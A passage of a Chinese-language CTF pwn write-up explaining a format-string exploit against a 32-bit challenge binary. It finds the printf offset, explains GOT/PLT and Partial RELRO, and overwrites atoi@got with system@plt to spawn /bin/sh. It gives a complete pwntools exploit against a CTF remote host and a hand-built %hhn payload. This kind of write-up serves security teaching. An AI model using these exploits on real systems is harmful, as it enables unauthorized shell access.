+<td>直接，但要处理空字节</td>
+</tr>
+<tr>
+<td><strong>B：GOT 劫持</strong></td>
+<td>把 <code>atoi@got</code> 改成 <code>system@plt</code>，第二次输入 <code>/bin/sh</code></td>
+<td>更通用，本文采用</td>
+</tr>
+</tbody></table>
+<p>两条路都建立在同一个漏洞上：<code>printf(buf)</code>。下面先把格式化字符串的读和写讲清楚，再分别走两条路。</p>
+<div class="note info flat"><p><strong>为什么 Canary 没有挡住？</strong></p>
+<p><code>buf</code> 是 100 字节，<code>read</code> 最多读 99 字节（<code>0x63</code>），刚好停在 Canary 前面一个字节。格式化字符串利用的是 <code>printf</code> <strong>按参数序号读栈</strong>，不是把数据写到 Canary 后面，所以 Canary 不会触发。</p>
+<p><code>read</code> 也不会自动补 <code>\0</code>，但 <code>buf</code> 后面很快就是 Canary 的低字节 <code>0x00</code>，<code>printf</code> 读到那里就停了。严格来说，可以在 payload 末尾补一个 <code>\x00</code> 更稳妥。</p>
+</div>
+
+<details class="note nx-note think">
+<summary><p><strong>思考 01｜往 <code>buf</code> 里放 4 个地址，会污染 Canary 吗？试着画图。</strong></p>
+</summary>
+<div class="nx-note__body"><p>不会。把栈帧画出来就清楚了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+--------------------------+  &lt;- ebp</span><br><span class="line">| 保存的 ebp / 返回地址 ... |</span><br><span class="line">+--------------------------+</span><br><span class="line">| Canary (v6)              |  &lt;- ebp-0xC</span><br><span class="line">+--------------------------+</span><br><span class="line">| buf[99]                  |  &lt;- ebp-0xD   （read 最多写到 buf[98]）</span><br><span class="line">| ...                      |</span><br><span class="line">| buf[0]                   |  &lt;- ebp-0x70</span><br><span class="line">+--------------------------+</span><br><span class="line">| nptr[16]                 |  &lt;- ebp-0x80</span><br><span class="line">+--------------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>buf</code> 从 <code>ebp-0x70</code> 开始，长 100 字节，正好到 <code>ebp-0xC</code>，也就是 Canary 的位置；</li>
+<li><code>read(0, buf, 0x63)</code> 最多读 99 字节，最后一个字节落在 <code>buf[98] = ebp-0xE</code>，离 Canary 还有 2 字节；</li>
+<li>4 个目标地址放在 <code>buf+44</code> 到 <code>buf+59</code>，离 Canary 还有几十字节；</li>
+<li>格式化字符串的 <code>%hhn</code> 写的是“参数指向的地址”（GOT），不是往栈上写数据。</li>
+</ul>
+<p>所以既没有栈溢出，也没有污染 Canary。Canary 只有在 <code>read</code> 写超过 99 字节、或者别的写操作覆盖到 <code>ebp-0xC</code> 时才会触发。</p>
+</div>
+</details>
+
+<h2 id="第三步：找偏移"><a href="#第三步：找偏移" class="headerlink" title="第三步：找偏移"></a>第三步：找偏移</h2><p>要控制 <code>printf</code> 读什么，先得知道缓冲区开头对应第几个参数。</p>
+<h3 id="先看栈布局"><a href="#先看栈布局" class="headerlink" title="先看栈布局"></a>先看栈布局</h3><p>32 位下，<code>printf(buf)</code> 调用时：</p>
+<ul>
+<li><code>[esp]</code> 是格式串指针，也就是 <code>buf</code> 的地址；</li>
+<li><code>[esp+4]</code> 是第 1 个可变参数；</li>
+<li><code>[esp+8]</code> 是第 2 个；</li>
+<li>以此类推。</li>
+</ul>
+<p>但 <code>buf</code> 本身也在栈上，它的位置和 <code>[esp]</code> 之间隔了多少个槽，取决于编译器怎么安排栈帧。<strong>这个数字不能靠猜，要用脚本测。</strong></p>
+<h3 id="测偏移的脚本"><a href="#测偏移的脚本" class="headerlink" title="测偏移的脚本"></a>测偏移的脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn8&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_offset</span>(<span class="params">p</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;AAAA&#x27;</span> + <span class="string">b&#x27;.%p&#x27;</span> * <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    res = p.recvline()</span><br><span class="line">    log.info(<span class="string">f&quot;Leak output: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parts = res.split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, part <span class="keyword">in</span> <span class="built_in">enumerate</span>(parts):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;41414141&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">            log.success(<span class="string">f&quot;Found offset: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn8&quot;</span>)</span><br><span class="line">offset = get_offset(p)</span><br><span class="line"><span class="built_in">print</span>(offset)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-4.png" alt="测偏移结果"></p>
+<p><em>图 4：输出里出现 <code>0x41414141</code>，对应偏移 10</em></p>
+<p>几个函数和细节：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>recvuntil(b&#39;your name:&#39;)</code></td>
+<td>等到程序输出提示符，确保后面读到的是 <code>printf</code> 的结果</td>
+</tr>
+<tr>
+<td><code>sendline(b&#39;AAAA&#39; + b&#39;.%p&#39; * 15)</code></td>
+<td>缓冲区前 4 字节放 <code>AAAA</code>，后面用 <code>.</code> 分隔 15 个 <code>%p</code></td>
+</tr>
+<tr>
+<td><code>recvline()</code></td>
+<td>读一行输出</td>
+</tr>
+<tr>
+<td><code>res.split(b&#39;.&#39;)</code></td>
+<td>按 <code>.</code> 切开，方便定位哪个 <code>%p</code> 打印出了 <code>41414141</code></td>
+</tr>
+<tr>
+<td><code>if b&#39;41414141&#39; in part</code></td>
+<td><code>AAAA</code> 的十六进制就是 <code>0x41414141</code>，找到它就找到了缓冲区开头</td>
+</tr>
+</tbody></table>
+<p><strong>为什么加 <code>.</code>？</strong> 因为 <code>%p</code> 的输出是 <code>0x41414141</code> 这种连续字符串，如果不加分隔符，多个值会粘在一起，很难判断哪个是第几个参数。加一个 <code>.</code>，就能干净地 <code>split</code>。</p>
+<p>输出大概是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello,AAAA.0xfff0e808.0x63.(nil).(nil).0x3.0xf7f78c34.0xfff0e870.</span><br><span class="line">0xfff0e874.0xf7f4ca26.0x41414141.0x2e70252e...</span><br></pre></td></tr></table></figure>
+
+<p>数一下：</p>
+<ul>
+<li><code>parts[0]</code> 是 <code>Hello,AAAA</code>（字面量，不算参数）；</li>
+<li><code>parts[1]</code> 是第 1 个 <code>%p</code>；</li>
+<li>……</li>
+<li><code>parts[10]</code> 是 <code>0x41414141</code>，也就是<strong>第 10 个参数</strong>。</li>
+</ul>
+<p>所以本题的偏移是 <strong>10</strong>。</p>
+<div class="note warning flat"><p><strong>IDA 里的 <code>[esp+0x14]</code> 不能直接当参数序号。</strong> 那是函数帧内的偏移；<code>printf</code> 调用时编译器还会调整参数区，实际序号要用脚本测。不同编译器、不同函数帧、不同优化级别，偏移都可能变。</p>
+</div>
+
+<details class="note nx-note think">
+<summary><p><strong>思考 02｜偏移 10 是由 <code>AAAA</code> 决定的，还是由栈布局决定的？把 <code>AAAA</code> 换成 <code>BBBB</code>，<code>%10$p</code> 会打印什么？</strong></p>
+</summary>
+<div class="nx-note__body"><p>偏移由栈布局决定，和内容无关。</p>
+<ul>
+<li><code>printf</code> 的参数序号是“第几个栈槽”，<code>buf</code> 开头固定是第 10 个参数；</li>
+<li>把前 4 字节换成 <code>BBBB</code>，<code>%10$p</code> 就会打印 <code>0x42424242</code>；</li>
+<li><code>%9$p</code> 读的是 <code>buf</code> 前面的那个栈槽，和 <code>buf</code> 的内容无关，所以不会跟着变。</li>
+</ul>
+<p>偏移是“位置”，<code>AAAA</code> &#x2F; <code>BBBB</code> 只是“放在这个位置上的值”。测偏移时用 <code>AAAA</code> 只是为了好认（<code>0x41414141</code>），换成别的标记也行。</p>
+</div>
+</details>
+
+<h2 id="第四步：GOT-表是什么，为什么能改"><a href="#第四步：GOT-表是什么，为什么能改" class="headerlink" title="第四步：GOT 表是什么，为什么能改"></a>第四步：GOT 表是什么，为什么能改</h2><p>在写 payload 之前，先把 GOT&#x2F;PLT 讲清楚，不然后面“改 atoi@got”会像天书。</p>
+<h3 id="GOT-和-PLT"><a href="#GOT-和-PLT" class="headerlink" title="GOT 和 PLT"></a>GOT 和 PLT</h3><p>动态链接的程序不会把 <code>printf</code>、<code>atoi</code> 这些 libc 函数的代码直接打进自己文件里，运行时才去 <code>libc.so</code> 找。问题是：<strong>每次调用都去 libc 里查地址太慢</strong>，所以有了 GOT&#x2F;PLT：</p>
+<table>
+<thead>
+<tr>
+<th>名字</th>
+<th>位置</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GOT</strong>（Global Offset Table）</td>
+<td>数据段</td>
+<td>存放外部函数的真实地址</td>
+</tr>
+<tr>
+<td><strong>PLT</strong>（Procedure Linkage Table）</td>
+<td>代码段</td>
+<td>一小段跳板代码，跳转到 GOT 里记录的地址</td>
+</tr>
+</tbody></table>
+<p>可以把它想成“电话号码簿”：</p>
+<ul>
+<li>PLT 是“拨号动作”；</li>
+<li>GOT 是“号码簿”，里面记着函数真正的地址。</li>
+</ul>
+<h3 id="延迟绑定（Lazy-Binding）"><a href="#延迟绑定（Lazy-Binding）" class="headerlink" title="延迟绑定（Lazy Binding）"></a>延迟绑定（Lazy Binding）</h3><p>程序刚启动时，GOT 里很多项并不知道真实地址。第一次调用某个函数时：</p>
+<ol>
+<li>PLT 跳到 GOT；</li>
+<li>GOT 里放的是一段“解析代码”（<code>_dl_runtime_resolve</code>）；</li>
+<li>解析代码找到函数的真实地址，写回 GOT；</li>
+<li>以后再次调用，PLT 直接从 GOT 拿到真实地址，跳过去执行。</li>
+</ol>
+<p>这就是<strong>延迟绑定</strong>。它的好处是启动快，坏处是 <strong>GOT 在运行时可写</strong>。</p>
+<h3 id="Partial-RELRO-意味着什么"><a href="#Partial-RELRO-意味着什么" class="headerlink" title="Partial RELRO 意味着什么"></a>Partial RELRO 意味着什么</h3><p><code>checksec</code> 里的 RELRO 有三种常见状态：</p>
+<table>
+<thead>
+<tr>
+<th>状态</th>
+<th>GOT 是否可写</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>No RELRO</code></td>
+<td>可写</td>
+<td>完全不保护</td>
+</tr>
+<tr>
+<td><code>Partial RELRO</code></td>
+<td><strong>可写</strong></td>
+<td>常见的默认状态</td>
+</tr>
+<tr>
+<td><code>Full RELRO</code></td>
+<td>只读</td>
+<td>启动时解析完所有符号，再把 GOT 设成只读</td>
+</tr>
+</tbody></table>
+<p>本题是 <code>Partial RELRO</code>，所以 <code>atoi@got</code> 可以被我们改写。</p>
+<p>不妨想想：既然 GOT 可写，把一个“马上要被调用”的函数 GOT 地址改成另一个函数，不就能控制程序了吗？</p>
+<p>正是如此。</p>
+<div class="note info flat"><p><strong>PLT 和 GOT 的关系，一句话记：</strong></p>
+<p><code>call atoi@plt</code> → <code>atoi@plt</code> 执行 <code>jmp [atoi@got]</code> → 跳到 GOT 里记录的地址。</p>
+<p>所以我们改的是 <code>atoi@got</code> 里的<strong>地址值</strong>，不是 <code>atoi@plt</code> 的代码。</p>
+</div>
+
+<details class="note nx-note think">
+<summary><p><strong>思考 03｜如果这题是 Full RELRO，<code>atoi@got</code> 还能改吗？不能的话，你会换什么写目标？</strong></p>
+</summary>
+<div class="nx-note__body"><p>不能。Full RELRO 会在程序启动时解析完所有符号，然后把 GOT 设成只读；再用 <code>%hhn</code> 往 <code>atoi@got</code> 写，会直接触发段错误。</p>
+<p>可以换的目标：</p>
+<table>
+<thead>
+<tr>
+<th>目标</th>
+<th>位置</th>
+<th>前提</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>栈上的返回地址</td>
+<td><code>main</code> 的栈帧</td>
+<td>知道栈地址 &#x2F; 能泄漏</td>
+</tr>
+<tr>
+<td><code>__malloc_hook</code> &#x2F; <code>__free_hook</code></td>
+<td>libc</td>
+<td>老版本 glibc，且知道 libc 基址</td>
+</tr>
+<tr>
+<td><code>exit_funcs</code> &#x2F; <code>_IO_file_jumps</code></td>
+<td>libc</td>
+<td>需要泄漏 libc</td>
+</tr>
+<tr>
+<td>程序自己的函数指针</td>
+<td>可写数据段</td>
+<td>题目里有函数指针</td>
+</tr>
+</tbody></table>
+<p>如果不想换目标，也可以走另一条路：用 <code>%s</code> 泄漏随机数，直接过 <code>atoi(nptr) == random</code> 的检查，让程序自己执行 <code>system(&quot;/bin/sh&quot;)</code>。这题有 Partial RELRO，所以 GOT 劫持是最省事的。</p>
+</div>
+</details>
+
+<h2 id="第五步：找-atoi-got-和-system-plt"><a href="#第五步：找-atoi-got-和-system-plt" class="headerlink" title="第五步：找 atoi@got 和 system@plt"></a>第五步：找 atoi@got 和 system@plt</h2><p>IDA 左侧的函数列表里，粉色背景的是外部函数：</p>
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-3.png" alt="IDA 函数列表"></p>
+<p><em>图 5：<code>read</code>、<code>printf</code>、<code>atoi</code>、<code>system</code> 等都是外部函数</em></p>
+<p>这里要关注两个：</p>
+<ul>
+<li><code>atoi</code>：在 <code>main</code> 里被调用，参数是 <code>nptr</code>（我们第二次输入的内容）；</li>
+<li><code>system</code>：程序里已经有 <code>system(&quot;/bin/sh&quot;)</code>，所以它的 PLT 一定存在。</li>
+</ul>
+<p>为什么选 <code>atoi</code>，不选 <code>printf</code>？</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>调用时机</th>
+<th>适不适合改</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>printf</code></td>
+<td>正在执行格式化字符串</td>
+<td>改它来不及影响当前调用，而且后续还要靠它输出</td>
+</tr>
+<tr>
+<td><code>atoi</code></td>
+<td>格式化字符串之后，参数是 <code>nptr</code></td>
+<td><strong>完美</strong>：下一次调用就用我们的第二个输入</td>
+</tr>
+<tr>
+<td><code>system</code></td>
+<td>条件成立后才调用</td>
+<td>改它没有意义，我们想让 <code>atoi</code> 变成它</td>
+</tr>
+</tbody></table>
+<p>把 <code>atoi@got</code> 改成 <code>system@plt</code> 之后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atoi(nptr)  →  system(nptr)</span><br></pre></td></tr></table></figure>
+
+<p>第二次输入 <code>/bin/sh</code>，就变成 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<h3 id="用-pwntools-拿地址"><a href="#用-pwntools-拿地址" class="headerlink" title="用 pwntools 拿地址"></a>用 pwntools 拿地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;atoi@got -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(atoi_got)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;system@plt -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_plt)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>本题的输出是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] atoi@got -&gt; 0x804c034</span><br><span class="line">[+] system@plt -&gt; 0x8049080</span><br></pre></td></tr></table></figure>
+
+<p>这就是脚本的好处：不用手动去 <code>readelf</code> 里翻地址，<code>elf.got</code> &#x2F; <code>elf.plt</code> 直接帮你查。</p>
+<p>如果手动查，也可以用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -r ./pwn8 | grep atoi</span><br><span class="line">objdump -d ./pwn8 | grep system</span><br></pre></td></tr></table></figure>
+
+<h2 id="第六步：用-fmtstr-payload-写-GOT"><a href="#第六步：用-fmtstr-payload-写-GOT" class="headerlink" title="第六步：用 fmtstr_payload 写 GOT"></a>第六步：用 fmtstr_payload 写 GOT</h2><h3 id="为什么用-hhn-而不是-n"><a href="#为什么用-hhn-而不是-n" class="headerlink" title="为什么用 %hhn 而不是 %n"></a>为什么用 <code>%hhn</code> 而不是 <code>%n</code></h3><p><code>atoi@got</code> 要写入的值是 <code>0x08049080</code>，大约 <strong>1.34 亿</strong>。如果用 <code>%n</code> 一次写 4 字节，<code>printf</code> 必须先打印 1.34 亿个字符，程序早就崩了，网络也扛不住。</p>
+<p><code>%hhn</code> 一次只写 1 字节，把 <code>0x08049080</code> 拆成 4 个字节：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x08049080</span><br><span class="line">= 0x08 0x04 0x90 0x80   （从高到低）</span><br><span class="line">内存里按小端排列：</span><br><span class="line">+0: 0x80</span><br><span class="line">+1: 0x90</span><br><span class="line">+2: 0x04</span><br><span class="line">+3: 0x08</span><br></pre></td></tr></table></figure>
+
+<p>每次最多打印 255 个字符，4 次就能写完，效率高得多。</p>
+<h3 id="用-API-一行搞定"><a href="#用-API-一行搞定" class="headerlink" title="用 API 一行搞定"></a>用 API 一行搞定</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;atoi_got: system_plt&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>参数解释：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>10</code></td>
+<td>偏移，也就是缓冲区开头对应第 10 个参数</td>
+</tr>
+<tr>
+<td><code>&#123;atoi_got: system_plt&#125;</code></td>
+<td>往 <code>atoi@got</code> 写入 <code>system@plt</code> 的值</td>
+</tr>
+<tr>
+<td><code>write_size=&#39;byte&#39;</code></td>
+<td>用 <code>%hhn</code> 逐字节写</td>
+</tr>
+</tbody></table>
+<p><code>fmtstr_payload</code> 会自动做这些事：</p>
+<ol>
+<li>把目标值拆成字节；</li>
+<li>按字节值排序，计算每次要补多少字符；</li>
+<li>把目标地址放到格式串末尾，并调整对齐；</li>
+<li>生成 <code>%...c%N$hhn</code> 序列。</li>
+</ol>
+<p>所以实际发出去的 payload 可能长这样（具体顺序由 pwntools 版本决定）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8c%19$hhn%120c%20$hhn%104c%21$hhn...&lt;地址1&gt;&lt;地址2&gt;&lt;地址3&gt;...</span><br></pre></td></tr></table></figure>
+
+<p>不用手算，直接发就行。</p>
+<h3 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn8&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;491041bb79ed2ac33b8fa279.tcp-ctf2.dasctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;atoi@got -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(atoi_got)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;system@plt -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_plt)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;atoi_got: system_plt&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注意这里要发<strong>两次</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>次数</th>
+<th>输入</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 次</td>
+<td><code>payload</code></td>
+<td>用格式化字符串改写 <code>atoi@got</code></td>
+</tr>
+<tr>
+<td>第 2 次</td>
+<td><code>/bin/sh</code></td>
+<td>作为被改后的 <code>atoi</code>（也就是 <code>system</code>）的参数</td>
+</tr>
+</tbody></table>
+<p>一次改 GOT 表，一次给函数传参。</p>
+<details class="note nx-note think">
+<summary><p><strong>思考 04｜第一次直接发 <code>/bin/sh</code> 行不行？第二次也发格式化字符串行不行？</strong></p>
+</summary>
+<div class="nx-note__body"><p>都不行，因为两次输入进的是不同的函数：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>读进</th>
+<th>被谁使用</th>
+<th>应该是什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 次</td>
+<td><code>buf</code></td>
+<td><code>printf(buf)</code></td>
+<td>格式化字符串 payload，用来改 <code>atoi@got</code></td>
+</tr>
+<tr>
+<td>第 2 次</td>
+<td><code>nptr</code></td>
+<td><code>atoi(nptr)</code></td>
+<td><code>/bin/sh</code>，作为改后的 <code>system</code> 的参数</td>
+</tr>
+</tbody></table>
+<ul>
+<li>第一次发 <code>/bin/sh</code>：它只是普通字符串，<code>printf</code> 里没有 <code>%n</code>，GOT 不会变；</li>
+<li>第二次发格式化字符串：<code>atoi</code> 已经被改成 <code>system</code>，<code>system</code> 会把这段字符串当 shell 命令执行，而不是当格式串解析。</li>
+</ul>
+<p>所以顺序和内容都不能换。</p>
+</div>
+</details>
+
+<h2 id="第七步：手动构造-payload（理解-fmtstr-payload）"><a href="#第七步：手动构造-payload（理解-fmtstr-payload）" class="headerlink" title="第七步：手动构造 payload（理解 fmtstr_payload）"></a>第七步：手动构造 payload（理解 fmtstr_payload）</h2><p>API 很好用，但至少要能看懂它生成了什么。下面用本题的真实地址手动推一遍。</p>
+<h3 id="目标字节"><a href="#目标字节" class="headerlink" title="目标字节"></a>目标字节</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atoi_got   = 0x0804c034</span><br><span class="line">system_plt = 0x08049080</span><br></pre></td></tr></table></figure>
+
+<p>要写入的 4 个字节：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>目标字节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>atoi_got + 0</code> &#x3D; <code>0x0804c034</code></td>
+<td><code>0x80</code></td>
+</tr>
+<tr>
+<td><code>atoi_got + 1</code> &#x3D; <code>0x0804c035</code></td>
+<td><code>0x90</code></td>
+</tr>
+<tr>
+<td><code>atoi_got + 2</code> &#x3D; <code>0x0804c036</code></td>
+<td><code>0x04</code></td>
+</tr>
+<tr>
+<td><code>atoi_got + 3</code> &#x3D; <code>0x0804c037</code></td>
+<td><code>0x08</code></td>
+</tr>
+</tbody></table>
+<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p><code>%hhn</code> 写入的是“当前已经打印的字符数”，所以后面的写入只能比前面大（或者加 <code>0x100</code> 绕回来）。为了少打印，按目标字节从小到大排：</p>
+<table>
+<thead>
+<tr>
+<th>顺序</th>
+<th>目标地址</th>
+<th>目标字节</th>
+<th>需要打印到的总数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>atoi_got + 2</code></td>
+<td><code>0x04</code></td>
+<td>4</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>atoi_got + 3</code></td>
+<td><code>0x08</code></td>
+<td>8</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>atoi_got + 0</code></td>
+<td><code>0x80</code></td>
+<td>128</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>atoi_got + 1</code></td>
+<td><code>0x90</code></td>
+<td>144</td>
+</tr>
+</tbody></table>
+<h3 id="放地址"><a href="#放地址" class="headerlink" title="放地址"></a>放地址</h3><p>把 4 个地址放在格式串末尾，每个 4 字节，共 16 字节。为了让地址落在 4 字节对齐的位置，格式串主体要补齐到 4 的倍数。</p>
+<p>格式串主体：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%4c%21$hhn%4c%22$hhn%120c%23$hhn%16c%24$hhn</span><br></pre></td></tr></table></figure>
+
+<p>长度是 43 字节，补一个 <code>a</code> 到 44 字节。地址从 <code>buf+44</code> 开始：</p>
+<ul>
+<li><code>buf+0</code> 是第 10 个参数；</li>
+<li><code>buf+44</code> 是 <code>10 + 44/4 = 21</code>，也就是第 21 个参数；</li>
+<li>四个地址依次是第 21、22、23、24 个参数。</li>
+</ul>
+<p>所以 payload 是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%4c%21$hhn%4c%22$hhn%120c%23$hhn%16c%24$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>  <span class="comment"># 补齐到 44 字节</span></span><br><span class="line">payload += p32(atoi_got + <span class="number">2</span>)   <span class="comment"># 第 21 个参数，写 0x04</span></span><br><span class="line">payload += p32(atoi_got + <span class="number">3</span>)   <span class="comment"># 第 22 个参数，写 0x08</span></span><br><span class="line">payload += p32(atoi_got + <span class="number">0</span>)   <span class="comment"># 第 23 个参数，写 0x80</span></span><br><span class="line">payload += p32(atoi_got + <span class="number">1</span>)   <span class="comment"># 第 24 个参数，写 0x90</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="验证计数"><a href="#验证计数" class="headerlink" title="验证计数"></a>验证计数</h3><table>
+<thead>
+<tr>
+<th>片段</th>
+<th>打印字符数</th>
+<th>累计</th>
+<th>写入地址</th>
+<th>写入值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%4c</code></td>
+<td>4</td>
+<td>4</td>
+<td><code>atoi_got+2</code></td>
+<td><code>0x04</code></td>
+</tr>
+<tr>
+<td><code>%4c</code></td>
+<td>4</td>
+<td>8</td>
+<td><code>atoi_got+3</code></td>
+<td><code>0x08</code></td>
+</tr>
+<tr>
+<td><code>%120c</code></td>
+<td>120</td>
+<td>128</td>
+<td><code>atoi_got+0</code></td>
+<td><code>0x80</code></td>
+</tr>
+<tr>
